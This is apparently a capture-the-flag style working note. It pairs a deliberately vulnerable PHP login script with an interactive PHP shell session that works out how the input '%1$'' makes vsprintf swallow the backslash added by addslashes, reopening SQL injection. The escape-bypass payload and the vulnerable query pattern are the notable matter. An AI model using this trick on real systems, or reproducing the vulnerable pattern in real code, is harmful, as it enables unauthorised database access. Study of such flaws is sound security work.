```php
 <?php require 'config.php';

class db extends Connection {
    public function query($sql) {
        $args = func_get_args();
        unset($args[0]);
        return parent::query(vsprintf($sql, $args));
    }
}

$db = new db();

if (isset($_POST['pass'])) {
    $pass = addslashes($_POST['pass']);
    $db->query("SELECT * FROM users WHERE password=('$pass') AND username=('%s')", 'admin');
} else {
    die(highlight_file(__FILE__,1));
} 
```

### vsprintf
 ##format

    The format string is composed of zero or more directives: ordinary characters (excluding %) that are copied directly to the result and conversion specifications, each of which results in fetching its own parameter.

    A conversion specification follows this prototype: %[argnum$][flags][width][.precision]specifier. 

```
php -a            
Interactive mode enabled

php > echo vsprintf("SELECT * FROM users WHERE password=('test123') AND username=('%s')", 'admin');
SELECT * FROM users WHERE password=('test123') AND username=('admin')
php > $pass = addslashes("pass'")
php > $pass = addslashes("pass'");
PHP Parse error:  syntax error, unexpected '$pass' (T_VARIABLE) in php shell code on line 2
php > echo $pass
php > $pass = addslashes("pass'")
php > echo $pass
php > echo $pass;
PHP Parse error:  syntax error, unexpected '$pass' (T_VARIABLE), expecting ';' or ',' in php shell code on line 2
php > echo $pass
php > $pass = addslashes("pass'");
PHP Parse error:  syntax error, unexpected '$pass' (T_VARIABLE), expecting ';' or ',' in php shell code on line 2
php > $pass = addslashes("pass'")
php > echo $pass
php > echo $pass;
PHP Parse error:  syntax error, unexpected 'echo' (T_ECHO) in php shell code on line 2
php > $pass = addslashes("pass'");
php > echo $pass;
pass\'
php > $pass = addslashes("shit'");
php > echo $pass;
shit\'
php > echo vsprintf("SELECT * FROM users WHERE password=('$pass') AND username=('%s')", 'admin');
SELECT * FROM users WHERE password=('shit\'') AND username=('admin')
php > echo vsprintf("SELECT * FROM users WHERE password=('test123\'') AND username=('%s')", 'admin');
SELECT * FROM users WHERE password=('test123\'') AND username=('admin')
php > echo vsprintf("SELECT * FROM users WHERE password=('test123%1$\'') AND username=('%s')", 'admin');
SELECT * FROM users WHERE password=('test123'') AND username=('admin')
php > $pass = addslashes("shit%1$'");
php > echo $pass;
shit%1$\'
php > echo vsprintf("SELECT * FROM users WHERE password=('$pass') AND username=('%s')", 'admin');
SELECT * FROM users WHERE password=('shit'') AND username=('admin')
php > 
```



